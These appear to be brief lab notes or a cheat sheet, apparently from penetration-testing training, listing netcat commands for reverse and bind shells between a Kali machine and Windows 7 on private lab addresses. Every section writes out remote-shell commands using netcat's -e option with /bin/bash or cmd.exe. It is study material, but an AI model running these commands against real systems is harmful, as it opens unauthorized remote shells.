# Reverse Shell from Kali to Windows

## Windows 7

nc.exe -nvlp 63389

> Would not work with the default 4444 port.

## Kali

nc -nv 10.11.9.175 63389 -e /bin/bash

---

# Reverse Shell from Windows to Kali

## Kali

nc -nvlp 63389

## Windows 7

nc.exe -nv 10.11.0.190 63389 -e cmd.exe

---

# Bind Shell from Windows to Kali

## Kali

nc -nvlp 63389 -e /bin/bash

## Windows 7

nc.exe -nv 10.11.0.190 63389

---

# Bind Shell from Kali to Windows

## Windows 7

nc.exe -nvlp 63389 -e cmd.exe

## Kali

nc -nv 10.11.9.175
